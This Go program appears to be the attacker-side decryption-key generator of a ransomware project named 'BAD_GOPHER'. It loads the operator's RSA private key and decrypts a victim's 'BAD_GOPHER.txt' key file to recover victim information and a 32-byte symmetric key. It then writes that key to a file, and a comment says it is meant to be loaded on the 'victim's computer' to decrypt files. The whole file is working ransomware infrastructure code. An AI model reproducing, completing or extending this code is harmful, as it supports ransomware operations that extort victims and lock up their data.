package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

func main() {
	// TODO: Make this more user-friendly, i.e. command line options for selecting
	// file and ability to drag gopher key file onto exe to generate decryption key
	privRaw, _ := ioutil.ReadFile("priv.pem")
	fmt.Println(privRaw)
	privPem, _ := pem.Decode(privRaw)
	fmt.Println(privPem)

	privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)
	fmt.Println(privKey.D)

	home, _ := os.UserHomeDir()
	keyFile, _ := os.Open(home + "/BAD_GOPHER.txt")
	keyFileText, _ := ioutil.ReadAll(keyFile)
	keyFileBytes, _ := hex.DecodeString(string(keyFileText))
	plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, keyFileBytes, nil)

	information := string(plaintext[:len(plaintext)-32])
	symmetricKey := plaintext[len(plaintext)-32:]
	fmt.Printf("Information:\n%s\n", information)
	fmt.Printf("Symmetric Key: %x\n", symmetricKey)

	// Save symmetric key to a file that can be loaded on victim's computer to decrypt files
	symmetricKeyEncoded := hex.EncodeToString(symmetricKey)
	filename := fmt.Sprintf("BAD_GOPHER_DECRYPT_%s", strings.ReplaceAll(strings.Split(information, "\n")[1], " ", "_")[:10])
	fmt.Println(filename)
	f, _ := os.Create(filename)
	defer f.Close()
	f.WriteString(symmetricKeyEncoded)
}
